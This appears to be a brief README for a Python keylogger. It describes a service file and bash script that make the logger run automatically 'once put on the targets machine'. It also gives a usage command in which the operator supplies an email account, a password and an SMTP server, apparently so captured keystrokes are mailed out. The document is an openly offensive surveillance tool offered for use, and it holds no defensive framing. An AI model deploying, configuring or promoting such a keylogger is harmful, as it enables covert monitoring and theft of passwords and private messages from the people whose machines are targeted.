Installation: Requires Python3 to be installed
There is also a service file and bash script that help it run automatically once put on the targets machine.

Usage: python3 key_logger.py [your email] [your password] [smtp server] [tls/notls] [buffer_size]
ex. python3 /usr/bin/key_logger.py email@gmail.com password smtp.gmail.com tls 50
